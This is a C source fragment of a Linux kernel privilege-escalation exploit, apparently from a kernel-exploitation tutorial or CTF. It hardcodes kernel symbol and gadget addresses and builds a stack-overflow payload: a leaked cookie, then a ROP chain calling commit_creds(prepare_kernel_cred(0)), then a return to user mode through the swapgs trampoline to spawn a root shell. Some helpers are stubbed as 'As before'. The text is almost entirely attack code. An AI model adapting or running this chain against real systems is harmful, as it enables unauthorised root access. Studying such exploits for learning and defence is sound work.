uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred = 0xffffffff814c67f0;
uint64_t commit_creds = 0xffffffff814c6410;
uint64_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81200f10;

uint64_t pop_rdi_ret = 0xffffffff81006370;
uint64_t mov_rdi_rax_clobber_rsi140_pop1 = 0xffffffff816bf203;

void open_dev(){
    // As before
};

void leak_cookie() {
  // As before
}

void spawn_shell() {
  /* Same as before as we're already back in user-land
   *  when this gets executed so SMEP/SMAP won't interfere
   */
}

void save_state() {
  // Same as before
}

uint64_t user_rip = (uint64_t)spawn_shell;

void write_ret() {
  uint8_t sz = 35;
  uint64_t payload[sz];
  payload[cookie_off++] = cookie;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = 0x0;
  payload[cookie_off++] = pop_rdi_ret;
  payload[cookie_off++] = 0x0;                 // Set up rdi=0
  payload[cookie_off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
  payload[cookie_off++] =
      mov_rdi_rax_clobber_rsi140_pop1;  // save ret val in rdi
  payload[cookie_off++] = 0x0;          // compensate for extra pop rbp
  payload[cookie_off++] = commit_creds; // elevate privs
  payload[cookie_off++] = swapgs_restore_regs_and_return_to_usermode + 22;
  payload[cookie_off++] = 0x0;      // compensate for extra pop rax
  payload[cookie_off++] = 0x0;      // compensate for extra pop rdi
  payload[cookie_off++] = user_rip; // Unchanged from here on
  payload[cookie_off++] = user_cs;
  payload[cookie_off++] = user_rflags;
  payload[cookie_off++] = user_sp;
  payload[cookie_off++] = user_ss;

  uint64_t data = write(global_fd, payload, sizeof(payload));

  puts("[!] If you can read this we failed the mission :(");
}

int main(int argc, char **argv) {
  open_dev();
  leak_cookie();
  save_state();
  write_ret();
}
